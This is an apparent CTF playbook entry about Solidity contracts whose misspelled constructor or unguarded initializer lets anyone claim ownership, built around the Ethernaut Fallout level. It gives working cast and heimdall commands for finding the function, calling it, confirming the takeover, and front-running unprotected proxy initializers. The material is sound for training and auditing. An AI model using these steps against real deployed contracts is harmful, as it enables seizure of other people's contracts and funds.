---
id: web3-constructor-typo-exposed-initializer
category: WEB
tags: [web3, blockchain, evm, solidity, constructor, initializer, typo, legacy-pragma, owner-takeover, access-control, public-function, uninitialized, ethernaut, fallout-level, pragma-0-4, cast]
tools: [Web3]
manuals: ["Manuals/Web3/3. Contexto para Claude.md"]
title: "Web3: exposed initializer (constructor with a typo / legacy pragma) callable by anyone"
difficulty: easy
created: 2026-10-07
updated: 2026-10-07
related: [web3-receive-fallback-weak-access-control, web3-commit-secret-msgsender-gated]
---

## How to recognize this pattern

- An old contract (`pragma solidity <0.4.22`) where the "constructor" is a function with the **same
  name as the contract**. If the name doesn't match **exactly** (typo, `l`→`1`, `O`→`0`, different
  case), the compiler does NOT treat it as a constructor → it becomes an ordinary public function,
  callable by anyone at any time.
- General symptom (beyond the typo): there's an **initializer** that sets `owner`/permissions and is
  **not protected** against being called again: `init()`, `initialize()`, `setup()` with no guard, or
  a constructor that never ran in a proxy pattern.
- The challenge goal: claim `owner`/`admin`. Usually **no ETH needed** (the function is often `payable`
  but accepts `msg.value = 0`).

## Method

Reference case: **Ethernaut, Fallout**. The function `Fal1out()` (with a `1`, not an `l`) was meant to
be the `Fallout()` constructor; the typo made it public → calling it sets `owner = msg.sender`.

The project toolchain is `cast` (Foundry), not the Ethernaut console. See
`Manuals/Web3/3. Contexto para Claude.md`.

```bash
CAST=~/.config/.foundry/bin/cast
RPC="<rpc>"; PK="<private key>"; T="<target addr>"; ME=$($CAST wallet address --private-key $PK)
```

### 1. Find the exposed init function

No source: decompile and look for a function that writes to `owner`/the admin slot:

```bash
heimdall decompile $T --rpc-url "$RPC"        # look for an init/constructor-like that sets owner
$CAST interface $T --rpc-url "$RPC" 2>/dev/null   # ABI if verified/4byte
```

Watch the **exact name** (char by char): the level's trick is visual (`1` vs `l`, `0` vs `O`).

### 2. Call the initializer yourself

```bash
$CAST send $T "Fal1out()" --private-key $PK --rpc-url "$RPC"   # adjust name/signature to the target
$CAST call $T "owner()(address)" --rpc-url "$RPC"              # confirm == $ME
```

If the function is `payable` but doesn't require a value, don't send `--value`. If it does, add
`--value <x>`.

## Gotchas

- **Exact name:** calling `Fallout()` (with `l`) reverts: that function doesn't exist; only
  `Fal1out()` (with `1`). Copy the selector/name from the decompile, don't type it from memory.
- `cast` needs the right **signature** (`name(types)`). When in doubt, take the 4-byte selector from
  the decompile and send it raw: `$CAST send $T 0x<selector> --private-key $PK --rpc-url $RPC`.
- Applies to any initializer with no guard, not just the typo: a proxy with an unprotected
  `initialize()` is the same takeover (front-run / call it first).
- Confirm the on-chain objective (`owner()`/`isSolved()`) and validate the flag against the CTF's configured flag format before declaring success.

## Transferable lesson

A real bug with historic losses. In legacy contracts (constructor = same-named function), a typo
exposes the init as a public function. Solidity ≥0.4.22 fixed it with the `constructor` keyword. In a
CTF: read function names char by char and be suspicious of any loose, unguarded "initializer".

## Related / Cross-reference

- `Arsenal/WEB/web3-receive-fallback-weak-access-control.md`: another owner takeover (via
  receive/fallback).
- `Manuals/Web3/3. Contexto para Claude.md`: `cast`/`heimdall` and the `instance.json` flow.
